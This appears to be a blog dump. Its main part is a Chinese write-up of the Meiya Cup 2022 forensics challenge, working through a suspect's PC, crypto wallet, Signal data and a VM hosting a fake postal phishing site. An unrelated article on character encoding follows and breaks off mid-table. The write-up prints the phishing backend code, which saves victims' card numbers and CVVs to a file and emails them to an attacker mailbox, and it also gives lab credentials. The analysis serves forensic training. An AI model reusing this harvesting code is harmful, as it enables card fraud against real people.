Encrypting Key using PBKDF2-SHA256... [+] Step 2: Unwrapping note encryption key using AES Key Unwrap... [+] Successfully unwrapped note key! [+] Step 3: Found encrypted content in column \u0026#39;ZDATA from ZICNOTEDATA\u0026#39;. [+] Step 4: Decrypting note content using AES-GCM... [+] Step 5: Decompressing Gzip data... ======== DECRYPTED NOTE (Z_PK=31) ======== ▒ Halo 123456▒ (▒ (▒ (▒ (▒ \u0026#34; ▒ c=!FCe8▒h▒hȕ* hȕ* ▒hȕ* ▒hȕ* ▒hɕ* ▒hɕ ============================================================ --- Processing Note Z_PK=33 --- [+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256... [+] Step 2: Unwrapping note encryption key using AES Key Unwrap... [+] Successfully unwrapped note key! [+] Step 3: Found encrypted content in column \u0026#39;ZDATA from ZICNOTEDATA\u0026#39;. [+] Step 4: Decrypting note content using AES-GCM... [+] Step 5: Decompressing Gzip data... ======== DECRYPTED NOTE (Z_PK=33) ======== 今天 ▒ (▒ (▒ \u0026#34; ▒ c=!FC*8 h☚* h☚* h☚ ============================================================ 上面的是\u0026quot;Halo\u0026quot;的，下面的是\u0026quot;今天\u0026quot;的，它们的内容和很多▒这样的奇怪字符混在一起，是因为它们被包裹在 Protobuf这种二进制结构中，用于保存格式、字体、附件引用等信息，我们现在看到的，就是把这个复杂的二进制结构强行当成文本显示的结果\n如何分辨？那最好还是丢给ai：\n那么123456应该就是题目说的数字串了\n123456 此时37题的真正的答案也出来了：\nHalo 林浚熙计算机(39-52) 39.林浚熙计算机(Computer) 的操作系统(Operating System) 版本是什么? A. Windows 10 Pro for Workstations 21H2\nB. Windows 10 Pro 22H2\nC. Windows 10 Home 21H2\nD. Windows 10 Pro for Workstations 21H1\n操作系统名称为Windows 10 Pro for Workstations，当前Build版本号是19044.2130，这是Windows 10 21H2的一个更新版本\nA 40.林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN)软件?(不要输入符号及空白，以大写英文及阿拉伯数字回答) 火眼支持详细分析的软件里面没有vpn，但在用户桌面找到一个快捷方式，ExpressVPN：\n为了保险起见（万一名称不完整），文件系统里面搜一下，确实是vpn： ExpressVPN 41.承上题，分析该虚拟专用网络的日志(Log)，他在哪天安装该虚拟专用网络?(如答案为 2022-12-29，需回答 20221229) log那么长谁看啊，直接火眼基本信息里看安装软件：\n20220915 42.检视林浚照计算机的数据，他使用哪种加密货币(Cryptocurrency) 以支付虚拟专用网络软件?以大写英文回答该加密货币的全名，如 BITCOIN) 电脑里面有四个浏览器，一个个搜索，最终在chrome里面搜索出来了：\nBitcoin 话说这不就是题目示例的吗，心理战这一块\n43.林浚熙的加密货币钱包Cryptocurrency Wallet) 名称是什么?不要输入符号，以大写英文及阿拉伯数字回答) 火眼里面找不到什么有用的信息，仿真进入电脑桌面看一下：\n看到了老熟人vpn，还有一个未知软件electrum，上网搜一下：\n这就是电子钱包了，打开看看：\nWallet后的就是钱包名了，后面还有密码\nTELLAW_IEH 不过题目说不要输入符号，不知道是什么意思\n44.林浚熙计算机里安装了哪个浏览器(Web Browser)? A.Tor Browser\nB.Opera\nC.Google Chrome\nD.Internet Explorer\nE.Microsoft Edge\n前文找使用的电子货币的时候已经说过了：\nACDE 45.林浚熙使用浏览器Google Chrome曾经浏览最多的是哪 个网站? A. https://gmail.com B. https://mail.google.com/mail C. https://web.whatsapp.com D. https://facebook.com C 46.除了上述网站,林浚熙曾使用浏览器Google Chrome搜索过什么? A. javascript教学\nB. php sql教学\nC. tor教学\nD. docker image教学\nE. electrum教学\n一个个搜就行\nBCDE 47.林浚照的计算机安装了一个通讯软件Signal，它的用户资讯储存路径是什么? A.\\Users\\HEI\\AppData\\Roaming\\Signal\nB.\\Program Files(x86)\\Signal\nC.\\Users\\HEI\\Desktop\\Signal\nD.\\Users\\user\\Roaming\\Signal\n我们在signal里面随便点开一个联系人，就能看见存储路径：\nA 48.通讯软件Signal采用一个档案存放用户的聊天记录，它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG) 打开私聊消息，右键任意消息记录，点击跳转到源文件：\n原来就是上一题看到过的db.sqlite：\nDBSQLITE 49.承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了Siqnal?(以阿拉伯数字回答) 很奇怪，不知道这题想问什么，联络人指的是林俊熙手机的联络人吗，那比对一下：\n这四个人的电话（+852）和昵称都对得上，那应该是四个\n4 另外，上一题的db文件打不开，经检查发现不是sqlite格式，也不是其他常见文件格式，不知道有什么猫腻\n50.林浚熙在“Signal\u0026rsquo; 曾经与某人对话，那人的手机号码是什么? 需要与区码(Area Code) 一同答(以阿拉伯数字) 上面过程中已经找过，是ROCKY，不多赘述：\n85270711901 51.承上题，两人在Signal\u0026rsquo; 的对话中有些讯息(Message) 包含附件，这些讯息的 \u0026lsquo;ID\u0026rsquo;包括? A.5b9650fe-3bb6-4182-9900-f56177003672\nB.46a8762b-78ea-49aa-a6f5-b24975ec189f\nC.9729bf92-ab9c-45f7-8147-66234296aele\nD.47233ffe-1a73-4b3d-b97c-626246ec3129\n完蛋了，db.sqlite文件打不开，做不了，难道是有隐写吗？可是也没发现任何线索\n52.承上题，林浚熙曾经于2022年10月20日转账（Transfer Money) 予上述对话人士,那次转账的参考编号是什么?(以大写英文及阿拉伯数字回答) N91088774024 林浚熙的VM(53-70) 53.林浚熙的计算机安装了多少台虚拟机Virtual Machine - VM) ?(以阿拉伯数字回答) A. 4\nB. 1\nC. 2\nD. 3\nB 54.林浚熙的计算机里的虚拟机(VM) 存放在什么路径? A.\\Users\\Public\\Documents \\Virtual Machines\nB.\\Program Files\\Virtual Machines\nC.\\User\\HEN\\Roaming\\Virtual Machines\\\nD.\\Users\\HEN\\Documents\\Virtual Machines\nD 到底是HEI还是HEN？应该是题目搞错了\n55.虚拟机 (VM) 使用什么版本的作业系统(Operating System) ? A. CentOs Linux 7.5.1804 (Core)\nB. Ubuntu 22.04.1 LTS\nC. CentOS Linux release 7.6.1810(Core)\nD. Ubuntu 20.04.5 LTS\n把这个.vmdk添加为新检材，查看基本信息：\nD 56.虚拟机(VM) 中的文件传输服务器(FTP Server) 有哪些用户? A. nobody\nB. root\nC. admin\nD. man\nE. ftpuser\n从这一步开始，只靠火眼是不行的了，我们必须想办法登录嫌疑人使用的ubuntu虚拟机\n首先我的想法是直接从火眼检材里面导出储存有虚拟机的文件夹，可是导出的却无法使用，总是提示\u0026quot;找不到ubuntu 64-bit.vmdk\u0026quot;，即使修改了.vmx文件，去掉路径空格也没有用，而且导出文件的好几个.vmdk似乎混在一起了，分卷大小很奇怪\n在之后，我想直接在仿真了嫌疑人windows的虚拟机里使用这个虚拟机，结果可能是因为我的电脑没有关闭hyper-v和vbs，让虚拟机不能使用虚拟化功能，而手动关闭需要做的操作太麻烦也太未知，遂放弃\n最后成功的方案：\n安装好vmvare tools之后，按照路径把windows虚拟机里面存放ubuntu的文件夹复制到本机电脑，因为不知道密码所以把.vmdk交给火眼仿真，让火眼重置并生成新的虚拟机，最后登录再使用ssh链接（方便操作）即可\n回到题目，判断ftp使用者的第一步是知道这台服务器上安装了哪一种ftp，使用下面命令查看：\nps aux | grep ftp 这里可以看到是vsftp\n具体判断方式需要审查vsftpd的黑白名单，结合uid和shell的允许与否，整理成下面的shell脚本：\n#!/bin/bash CONFIG=\u0026#34;/etc/vsftpd.conf\u0026#34; FTPUSERS=\u0026#34;/etc/vsftpd.ftpusers\u0026#34; USER_LIST_FILE=\u0026#34;/etc/vsftpd.user_list\u0026#34; if ! systemctl is-active --quiet vsftpd; then echo \u0026#34;vsftpd 未运行\u0026#34; exit 1 fi [ ! -f \u0026#34;$CONFIG\u0026#34; ] \u0026amp;\u0026amp; { echo \u0026#34;配置文件不存在\u0026#34;; exit 1; } LOCAL_ENABLE=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;local_enable=.*YES\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo YES || echo NO) ANONYMOUS_ENABLE=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;anonymous_enable=.*YES\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo YES || echo NO) USERLIST_ENABLE=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;userlist_enable=.*NO\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo NO || echo YES) USERLIST_DENY=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;userlist_deny=.*NO\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo NO || echo YES) BLACKLIST=() [ -f \u0026#34;$FTPUSERS\u0026#34; ] \u0026amp;\u0026amp; while IFS= read -r line; do [[ -z \u0026#34;$line\u0026#34; || \u0026#34;$line\u0026#34; =~ ^# ]] || BLACKLIST+=(\u0026#34;$line\u0026#34;) done \u0026lt; \u0026#34;$FTPUSERS\u0026#34; USER_LIST=() [ -f \u0026#34;$USER_LIST_FILE\u0026#34; ] \u0026amp;\u0026amp; while IFS= read -r line; do [[ -z \u0026#34;$line\u0026#34; || \u0026#34;$line\u0026#34; =~ ^# ]] || USER_LIST+=(\u0026#34;$line\u0026#34;) done \u0026lt; \u0026#34;$USER_LIST_FILE\u0026#34; USERS=() while IFS=: read -r username _ uid _ _ _ shell; do if [ \u0026#34;$uid\u0026#34; -ge 1000 ] \u0026amp;\u0026amp; [[ \u0026#34;$shell\u0026#34; != /usr/sbin/nologin \u0026amp;\u0026amp; \u0026#34;$shell\u0026#34; != /bin/false ]]; then USERS+=(\u0026#34;$username\u0026#34;) fi done \u0026lt; /etc/passwd ALLOWED_USERS=() if [ \u0026#34;$LOCAL_ENABLE\u0026#34; = \u0026#34;YES\u0026#34; ]; then for u in \u0026#34;${USERS[@]}\u0026#34;; do [[ \u0026#34; ${BLACKLIST[*]} \u0026#34; == *\u0026#34; $u \u0026#34;* ]] \u0026amp;\u0026amp; continue if [ \u0026#34;$USERLIST_ENABLE\u0026#34; = \u0026#34;YES\u0026#34; ]; then if [ \u0026#34;$USERLIST_DENY\u0026#34; = \u0026#34;YES\u0026#34; ]; then [[ \u0026#34; ${USER_LIST[*]} \u0026#34; == *\u0026#34; $u \u0026#34;* ]] \u0026amp;\u0026amp; continue else [[ \u0026#34; ${USER_LIST[*]} \u0026#34; != *\u0026#34; $u \u0026#34;* ]] \u0026amp;\u0026amp; continue fi fi ALLOWED_USERS+=(\u0026#34;$u\u0026#34;) done fi echo \u0026#34;实际可登录 FTP 用户:\u0026#34; if [ ${#ALLOWED_USERS[@]} -eq 0 ]; then echo \u0026#34;无用户可登录\u0026#34; else printf \u0026#34;%s\\n\u0026#34; \u0026#34;${ALLOWED_USERS[@]}\u0026#34; fi [ \u0026#34;$ANONYMOUS_ENABLE\u0026#34; = \u0026#34;YES\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;匿名用户可登录\u0026#34; 我们保存为test.sh，给他添加执行权限：\nchmod +x test.sh 运行：\n./test.sh 一共两个，其中只有ftpuser符合题目选项\nD 57.虚拟机设置了什么网页服务器(Web Server)? A. NGINX\nB. LIGHTTPD\nC. WORDPRESS\nD. APACHE\nE. IIS\n直接在火眼里就能分析，明面上的有apache和nginx，docker容器里面还有一个nginx，再没别的了：\nAD *做到后面回来看，会发现其实真正只有一个 —— docker的nginx是可以使用的，本机无法检测到nginx和apache，所以这一题真正应该是只nginx：\nA *再次更正，其实是有apache的，只不过服务名称是apache2，所以答案还是：\nAD 58.网页服务器目录内有图片档案，而此档案的储存位置是? A. /var/www/html/post/src\nB. /var/www/html/post/css\nC. /var/www/html/post/vendor\nD. /var/www/post\n没有tree命令，我们使用ls查看一下/var/www：\nls -R -1 /var/www 在/var/www/html/post/css下发现.png文件：\nB 59.分析网页服务器的网站数据，假网站的公司名称是什么? A. Krick Global Logistics\nB. Global Logistics\nC. Krick Post Global Logistics\nD. Krick Post\n一开始我以为火眼分析的apache是错的，因为除了一条空的站点信息啥也没有，但点进去才发现原来这是apache的配置文件，这台服务器上搭载了的是apache2\n其实在上一题就应该意识到了，因为本机没有nginx，却有/var/www目录\n在配置文件里面也能够找到网站页面存放的位置：\n那么同上题图，就可以知道一共有html和post两个页面\n服务器的apache2已经打开了，直接访问一下，发现html访问不了，只有post有用：\nC 不要忽略了Krick Post下还有一行小字Global Logistics\n60.检视假网站首页的显示，AY806369745HK 代表什么? A. 邮件号码\nB. 邮件收费号码\nC. 邮件序号\nD. 邮件参考号码\n同上题图：\nA 61.分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么?(不要输入“，以大写英文及阿拉数字回答。如 Cat10.jpg，需回答CAT10JPG) 查看网站介绍界面/var/www/html/post/index.php，发现这个表单提交数据的方式是：\n\u0026lt;form align=\u0026#34;center\u0026#34; action=\u0026#34;process.php\u0026#34; method=\u0026#34;post\u0026#34; name=\u0026#34;Customerinfo\u0026#34;\u0026gt; 表单会提交到process.php进行文件处理，也就是说档案名取决于process.php内部的实现\n这个文件也在index.php同级，查看可以看到提交的数据会被写入一个固定的文件：\n$resultFile = \u0026#34;vu.txt\u0026#34;; $fOpen = fopen($resultFile, \u0026#34;a\u0026#34;); fwrite($fOpen, \u0026#34;Date \u0026amp; Time: \u0026#34;.$dateTime.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card Holder: \u0026#34;.$holdername.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card no.: \u0026#34;.$cardno.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;cvv: \u0026#34;.$cvv.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;expire date: \u0026#34;.$exp_mth.\u0026#34;/\u0026#34;.$exp_yr.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Email: \u0026#34;.$email.\u0026#34;@\u0026#34;.$email_domn.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Browser Info: \u0026#34;.$browser.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;\\n\u0026#34;); //End of Entry fclose($fOpen); 也就是说档案名是固定的vu.txt，我们也见过，这个文件也在index.php同级\nVUTXT 62.分析假网站档案，process.php\u0026rsquo; 源码(Source Code),推测此档案的用途可能是? A. 改变函数\nB. 产生档案\nC. 发出邮件\nD. 更新数据库\n依旧process.php：\n// 从 POST 获取受害人提交的数据 $holdername = $_POST[\u0026#34;holdername\u0026#34;]; $cardno = $_POST[\u0026#34;cardno\u0026#34;]; $cvv = $_POST[\u0026#34;cvv\u0026#34;]; $exp_mth = $_POST[\u0026#34;exp_mth\u0026#34;]; $exp_yr = $_POST[\u0026#34;exp_yr\u0026#34;]; $email = $_POST[\u0026#34;email\u0026#34;]; $email_domn = $_POST[\u0026#34;email_domn\u0026#34;]; // 设置档案名称 $resultFile = \u0026#34;vu.txt\u0026#34;; // 打开档案并写入数据 $fOpen = fopen($resultFile, \u0026#34;a\u0026#34;); fwrite($fOpen, \u0026#34;Date \u0026amp; Time: \u0026#34;.$dateTime.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card Holder: \u0026#34;.$holdername.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card no.: \u0026#34;.$cardno.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;cvv: \u0026#34;.$cvv.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;expire date: \u0026#34;.$exp_mth.\u0026#34;/\u0026#34;.$exp_yr.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Email: \u0026#34;.$email.\u0026#34;@\u0026#34;.$email_domn.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Browser Info: \u0026#34;.$browser.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;\\n\u0026#34;); //End of Entry fclose($fOpen); ... use PHPMailer\\PHPMailer\\SMTP; require_once __DIR__ . \u0026#39;/vendor/phpmailer/src/Exception.php\u0026#39;; $mail = new PHPMailer(true); $mail-\u0026gt;isSMTP(); $mail-\u0026gt;Host = \u0026#39;smtp.gmai1.com\u0026#39;; $mail-\u0026gt;SMTPAuth = true; $mail-\u0026gt;SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; $mail-\u0026gt;Port = 587; $mail-\u0026gt;Username = \u0026#39;chunhe11amm@gmail.com\u0026#39;; $mail-\u0026gt;Password = \u0026#39;rtatsceucpacocbdacs\u0026#39;; $mail-\u0026gt;setFrom(\u0026#39;chunhe11amm@gmail.com\u0026#39;, \u0026#39;Smith\u0026#39;); $mail-\u0026gt;addAddress(\u0026#39;chunhe11amm@gmail.com\u0026#39;, \u0026#39;Tyler\u0026#39;); $mail-\u0026gt;IsHTML(true); $mail-\u0026gt;Subject = \u0026#34;vu\u0026#34;; $mail-\u0026gt;Body = $message; $mail-\u0026gt;AltBody = \u0026#39; \u0026#39;; $mail-\u0026gt;send(); 它做了两件事：\n产生档案：把受害人提交的数据写入vu.txt\n发出邮件：将提交的数据通过PHPMailer发送到指定邮箱\nBC 63.检视档案process.php\u0026rsquo; 源码, 林浚照的电邮密码是?(以大写英文回答) 上一题的代码就能看出来，有这样一行：\n$mail-\u0026gt;Password = \u0026#39;rtatsceucpacocbdacs\u0026#39;; 也就是说电邮密码是：\nRTATSCEUCPACOCBDACS 64.分析档案process.php\u0026rsquo; 源码, 它不会收集哪些资料? A. GPS位置\nB. 信用卡号码\nC. 短讯验证码\nD. 电话号码\nE. 电邮地址\n还是看源码，不多赘述了\nACD 65.虚拟机 (VM) 安装了 Docker 程序，列出一个以'5\u0026rsquo;作为开端的 \u0026lsquo;Docker\u0026rsquo; 镜像 (Image) ID (以阿拉伯数字及大写英文回答) 这也能作为题目吗\u0026hellip;\n5d58c024174d 66.Docker 容器 (Container) \u0026lsquo;mysql\u0026rsquo; 对外开放的通讯端口 (Port) 是? 启动看一眼：\n43306 67.Docker容器mysql，用户\u0026rsquo;root\u0026rsquo; 的密码是?(以大写英文及阿拉伯数字回答) 查看命令历史记录：\n2wsx3edc 68.Docker容器，mysql 里哪一个数据库储存了大量个人资料?(以大写英文回答) 在本机链接数据库，账号密码root/2wsx3edc，一找就找到了：\nCUSTOMER 69.检视 Docker 容器\u0026rsquo;mysql\u0026rsquo; 内数据库里的资料，李大辉的出生日期是?(如答案为 2022-12-29，需答 20221229) sql查询（不知道为什么搜名字搜不出来，可能是过滤条件没写好，电话在李大辉手机可以得到）：\nSELECT DOB FROM customer WHERE Tel = \u0026#39;852-56412770\u0026#39; 19850214 70.通过取证调查结果进行分析(包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案? A.传送儿童色情物品\nB.抢劫\nC.诈骗\nD.勒索金钱\nE.购买毒品\n最好玩的一题\nC是对李大辉\nD是对王晓琳\nE是在林俊熙电脑里面的signal可以看见溜冰的记录： 死罪！！！！\nCDE 总算做完了，这套题是处处透露着诡异，个别题目意义不明，难度两极分化，选择题太多，根据选项才能得到结果，不根据选项又白白浪费提示，要绕很大一圈\n不过整体来说过程还是很清楚的，好玩还是挺好玩\n","date":"2025-08-15T21:32:09+08:00","image":"http://picture.928330.xyz/typora/638b75a2d7286.jpg","permalink":"https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"美亚杯2022取证总结"},{"content":"在计算机的世界里，我们看到的所有内容 —— 无论是文字、符号还是表情 —— 本质上都是一串串由0和1组成的二进制数字\n那么一个我们能看懂的、有意义的符号，是如何被计算机存储，又是如何被准确无误地显示出来的呢？\n这个过程就是我们今天要讲述的关于“字符”的完整故事\n基础概念：字符、字形、字节与字 要理解后续的一切，我们必须先精确区分几个最基本的概念：\n抽象的语义单位 —— 字符（Character） 具象的视觉单位 —— 字形（Glyph） 计算机的物理存储单位 —— 字节（Byte） 以及容易混淆的“字”——计算机的字（Word） 与 人类语言的字 字符（Character） 字符，是一个抽象的、信息的基本语义单元，是我们用来表达意义的最小符号\n英文字母A、b、c是字符\n数字1、2、3是字符\n标点符号.、?、!是字符\n汉字中、国、人是字符\n表情符号😂、👍也是字符！\n在这个层面，字符是无形的，它只关乎“是什么”，而不关乎“长什么样”或“如何存储”\n字形（Glyph） 字形，是字符的具体视觉表现形式，是我们真正在屏幕上看到的那个“形状”\n一个字符可以有多种不同的字形：\n字符“拉丁字母A”可以有 A (正常), A(粗斜体), 𝔸 (空心) 等多种字形 同一个汉字“骨”，在宋体、楷体、草书中的字形也完全不同。 反过来，多个字符也可能组合成一个字形（这被称为“合字”或“连字”，Ligature）：\n在某些英文字体中，字符 f 和 i 相邻时，会合并成一个单独的 ﬁ 字形，以避免 f 的钩与 i 的点碰撞。 简单说：字符是“骨”，字形是“皮肉”。我们操作和存储的是字符，而最终渲染出来给人看的是字形。\n字节（Byte） 字节，是计算机中数据存储和处理的基本单位\n一个字节由8个比特（bit）组成，每个比特非0即1 一个字节能表示2⁸=256种不同的状态（0-255） 字（Word） 计算机的“字”与人类的“字”毫无必然联系\n计算机中的“字”（Word） 在计算机科学中，字（Word）是CPU处理数据的自然单位，是计算机一次性读取、处理或传输的最小数据块\n字的大小依赖于计算机架构：\n16 位系统的一个字是 2 个字节（16 位） 32 位系统的一个字是 4 个字节（32 位） 64 位系统的一个字是 8 个字节（64 位） 在汇编语言和系统底层编程中，“字”是非常重要的基本数据宽度概念\n人类语言中的“字” 在人类语言里，“字”指的是一个书写符号单位：\n在中文里，“字”通常是一个汉字，例如中、国 在英文里，没有严格对应的“字”概念，通常用letter（字母）或word（单词）描述 在日语里，一个“字”可能是汉字、平假名、片假名中的任意一个符号 在大多数情况下，人类语言里的“字”可以看作是一个字符，但它们并不是严格等同的概念\n我们可以认为一个英语单词是一个“字”，但它却是多个“字符”的组合\n那么此时，矛盾就出现了：\n世界上有成千上万个抽象的“字符”，而计算机的基本存储单元“字节”一次只能表示256种状态！\n这就需要建立一套完整的映射体系，才能让所有字符都能在计算机上显示\n字符集 为了让计算机能够处理字符，人们首先需要做一件事：\n把世界上所有的字符收集起来，排个队，给每个字符分配一个独一无二的编号\n字符集，就是这样一个“字符的集合”以及“字符与编号的对应表”。可以把它想象成一本为全世界所有字符编写的巨大“字典”，而对应的编号，我们称之为码点\n字符集本身只是一套标准、一个“名册”，它只规定了“哪个字符对应哪个数字”，但还没有规定这个数字具体应该如何在计算机中用字节来存储\n字符集的历史演进与兼容性问题 ASCII时代 计算机诞生于美国，最早的ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）字符集是为英语环境量身定做的\n它收录了128个最常用的字符，包括：\n95个可打印字符：大小写英文字母（A-Z, a-z）、数字（0-9）、以及各种标点和符号（!,@,#等）\n33个不可打印的控制字符：如回车（CR）、换行（LF）、制表符（Tab）等，用于控制打印机等设备\n它的码点范围是0到127，所以用一个字节（0-255）来存储一个ASCII 字符绰绰有余\n实际上，ASCII码只用到了一个字节（8个比特）中的低7位，最高位始终为0\n例如，字符'A'的码点是 65，其二进制表示为01000001\n这个“最高位为0”的特性，为后来的扩展埋下了伏笔\nASCII码现在依然在被广泛使用，你可以在很多编程语言里面见到它，而且可以说它是现代字符编码体系的根基\n地区性字符集时代 当计算机走向世界，问题出现了：\n欧洲需要 é, ü，中国需要汉字，日本需要假名，单一的 ASCII 远远不够用！\n于是，世界各地纷纷利用ASCII留下的“遗产”—— 那个未被使用的最高位比特0，来扩展自己的字符集\n当一个字节的最高位是0时，它仍然表示一个标准的ASCII字符\n当最高位是1时，它就进入了各个地区自定义的“扩展区”（码点范围 128-255）\n下面是一些比较有代表性的编码方案吗，我们后面还会详细说明：\nISO-8859-1 (Latin-1)\n面向西欧，它利用了128-255的码点来表示带音标的字母，如é、ü、© 等\nGB2312/GBK\n面向中国大陆，由于汉字数量远超128个，它采用双字节编码方案\n当检测到一个字节的最高位是1时，就认为它和紧随其后的下一个字节共同表示一个汉字\nGBK 是 GB2312 的扩展，收录了更多汉字\nBIG5\n面向中国台湾地区，同样是双字节方案，用于表示繁体字\nShift_JIS\n面向日本，是一个更复杂的变长编码方案，用于表示日文汉字和假名\n虽然这样方便了各个地区的用户，但也是之后乱码问题出现的罪魁祸首\nUnicode时代 为了终结大家各用各的这种混乱，Unicode应运而生\n它的目标是“天下书同文”，它不是要创造又一个与其它标准竞争的字符集，而是要统一和包容所有字符！\n也就是说，它要为地球上每一种语言的每一个字符都分配一个全球唯一的码点！\n这一伟大的工程应该造福了全人类·，所以我们也叫他统一码/万国码\nUnicode码点的标准表示方法是用U+十六进制数字来表示：\n汉字中 的Unicode码点是U+4E2D 表情😂 的Unicode码点是U+1F602 你也可能看到另一种方法：\\u+十六进制数字，这是编程语言中的转义字符表示法：\n汉字中 的Unicode转义字符是\\u4E2D 表情😂 的Unicode转义字符是\\u1F602 如何存储如此庞大的字符量呢？\nUnicode标准码点范围是从U+0000到U+10FFFF，共计约1,114,112个码点\n这些码点被划分成17 个平面（Planes），每个平面包含65536（即 2¹⁶）个码点：\n基本多文种平面（BMP, Plane 0）\n包含了从U+0000到U+FFFF的码点，涵盖了世界上绝大多数常用字符，包括常用汉字\n辅助平面（Supplementary Planes, Plane 1–16）\n包含了从U+010000到U+10FFFF的码点，用于表示生僻字、古代文字以及各种符号，比如Emoji表情\n从此，无论在哪个国家、哪个平台，U+4E2D永远只代表中这一个字符\n字符集标准组织 制定这些标准的是一些国际组织，其中最重要的是：\nUnicode联盟（Unicode Consortium）\n一个非营利组织，其成员包括苹果、谷歌、微软、Adobe等各大科技巨头。它负责开发、维护和推广Unicode标准，包括我们日常使用的Emoji表情的标准化\n国际标准化组织（ISO）\n它也发布了与Unicode对应的 ISO/IEC 10646 标准，基本上可以认为Unicode和 ISO/IEC 10646 是同一个字符集标准的不同名称\n至此，我们通过字符集，成功地将所有抽象的字符转化为了全球统一的数字（码点）\n一个极其重要的问题：\nUnicode本身只定义了码点，它并没有规定这个号码在计算机中应该如何用字节来存储！\n编码 现在我们有了“字符”和“码点”的对应关系（字符集），但还有一个最关键、最实际的问题没有解决：\n如何将这些码点（数字），特别是那些大于 255 的庞大数字，高效地用计算机唯一懂的语言来表示？\n答案是编码 —— 将字符的码点（数字）翻译成字节序列（物理存储）的具体规则\n如果说字符集是字典，那编码就是语法规则，它教我们如何用字节来书写字典里的每一个页码（码点）\n编码格式 在编程领域，为了处理非ASCII字符，历史上形成了两种截然不同的解决思路\n多字节字符集 (MBCS - Multi-byte Character Set) 这是一种“让程序变聪明”的编码层面解决方案\n字符串在内存中仍然以char数组的形式存放，但程序在处理时，必须“意识到”这个字节序列采用了某种特定编码（如 GBK）\n比如，对于C语言字符串 \u0026quot;你好\u0026quot;，在GBK编码下，它占4个字节\nstrlen(\u0026quot;你好\u0026quot;)会返回4，因为它只认识字节 而一个特殊的、能识别多字节的函数mbstrlen(\u0026quot;你好\u0026quot;)则会返回2，因为它知道两个字节才构成一个汉字 这种方式处理起来非常复杂且极易出错，因为我们不能再想当然地通过str[i]来访问第i个字符 —— str[i]可能只是一个汉字的前半部分！字符串的截取、遍历和修改都变得困难了！\n宽字符 (Wide Character) 这是一种“让数据类型变强大”的数据类型层面解决方案\n它不再让程序去适应复杂的字节流，而是定义了一个新的、足够宽的数据类型，这个类型通常是2或4个字节\n比如我们在C++中定义一个这样的宽字符wchar_t类型：\nwchar_t* wide_str = L\u0026#34;你好\u0026#34;; wide_str数组的每个元素都能完整地存放一个字符的码点，而L前缀告诉编译器，这个字符串用宽字符存储，不是普通的char字符串\nwide_str[0]就是字符你，wide_str[1]就是字符好，数组长度为2\n这让字符串的索引和遍历恢复了简单\n他也有不少缺点：\n空间浪费\n即使是存储纯英文 \u0026ldquo;hello\u0026rdquo;，每个字符也要占用2或4个字节，造成空间浪费\n跨平台困难\n虽然很难以置信，但wchar_t的具体大小在不同主流操作系统上并不统一！\n在 Windows 上它通常是 2 字节（对应 UTF-16），而在 Linux 和 macOS 上它通常是 4 字节（对应 UTF-32），这使得依赖 wchar_t 的代码难以跨平台移植！\n+++\n正是因为这两种早期方案都有明显的缺陷，现代编程实践大多推荐直接使用UTF-8编码的普通char字符串，并配合专门、可靠的库（如 ICU）来处理复杂的字符串操作\n至于什么是UTF-8编码，我们接着往下看\n编码方式 ASCII编码 最简单的编码，码点值就是字节值\n字符'A'的码点是 65，其编码就是一个值为 65 的字节\nGBK编码 GBK的全称是国标扩展码拼音“Guóbiāo Kuòzhǎn”的缩写\n这是一种典型的多字节编码（MBCS），解码时检查一个字节的最高位：\n如果为0（0-127），则它本身就是一个单字节的ASCII字符 如果为1（128-255），则它必须和紧随其后的下一个字节共同组成一个双字节的汉字 UTF-8编码（现代标准） 这是现代互联网的基石，它是一种针对Unicode的、可变长度的字符编码，其设计堪称精妙绝伦\n它兼容ASCII编码：对英文字母和数字用1个字节编码，与ASCII完全一样，这意味着一个纯英文的ASCII文件，本身就是一个合法的UTF-8文件，无需任何转换\n它对不同字符有不同字节规定：对拉丁文、希腊文用2字节；对常用汉字用3字节；对罕见字符和表情用4字节\nUTF-8通过每个字节开头的几个比特来标记这个字符的长度：\n0xxxxxxx: 单字节，表示U+0000到U+007F(ASCII) 110xxxxx 10xxxxxx: 双字节，由一个110开头的字节和个10开头的字节组成 1110xxxx 10xxxxxx 10xxxxxx: 三字节，由一个1110开头的字节和两个10开头的字节组成 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx: 四字节 具体对应关系如下：\nUnicode 范围 (十六进制) UTF-8 字节序列 (二进制) 字节数 常见语言/用途举例 